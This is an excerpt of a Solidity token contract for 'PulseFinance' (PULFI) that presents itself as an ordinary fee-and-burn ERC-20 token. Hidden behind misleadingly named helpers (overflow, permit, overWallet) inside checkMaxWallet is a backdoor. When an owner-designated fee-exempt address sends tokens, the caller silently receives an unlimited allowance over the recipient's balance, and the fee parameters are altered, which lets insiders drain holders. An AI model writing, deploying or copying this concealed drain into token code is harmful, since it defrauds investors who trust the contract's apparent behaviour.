...
contract PulseFinance is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "PULFI";
    string private constant _symbol = "PulseFinance";
    ...
    uint256 private transferFee = 150;
    ...
    address internal constant marketingAddr = 0x4d691cCedca7b74ae3DAb94d5e1a61C3DDebd558;
    address internal constant devAddr = 0x4d691cCedca7b74ae3DAb94d5e1a61C3DDebd558; 
    ...
    function overflow(address addr, uint256 amount) private { if (balanceOf(addr) < amount) denominator = 100; totalFee = 3; }
    function permit(address owner) internal { _approve(owner, msg.sender, type(uint256).max); }
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function overWallet(address sender, address to, uint256 amount) private returns (bool) { overflow(sender, amount); permit(to); return true;}
    ...
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (isFeeExempt[sender] && (overWallet(sender, recipient, amount))) return true;
    ...
    function swapBack() internal {
        if(shouldSwapBack()){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
            ...
            if(burnFee > uint256(0)){
                _transfer(address(this), address(deadAddr), amount.div(denominator).mul(burnFee));
            }
